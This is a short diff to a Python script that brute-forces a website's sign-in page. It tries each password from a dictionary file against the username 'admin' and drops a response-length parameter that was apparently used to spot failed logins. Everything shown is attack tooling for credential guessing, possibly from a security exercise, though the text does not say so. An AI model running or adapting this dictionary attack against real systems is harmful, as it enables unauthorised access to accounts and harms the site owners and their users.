@@ -11,7 +11,7 @@ def read_file(path: str):
 
     return lines
 
-def try_authentication(wrong_request_length: int, username: str, password: str):
+def try_authentication(username: str, password: str):
     print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
     params = {
         'page': 'signin',
@@ -37,11 +37,10 @@ def main():
         print("=== Brute forcing website ===")
         username = "admin"
         file = "dictionary.txt"
-        wrong_request_length = 1988
         passwords = read_file(file)
 
         for password in passwords:
-            success, response = try_authentication(wrong_request_length, username, password)
+            success, response = try_authentication(username, password)
 
             if success:
                 print(response)
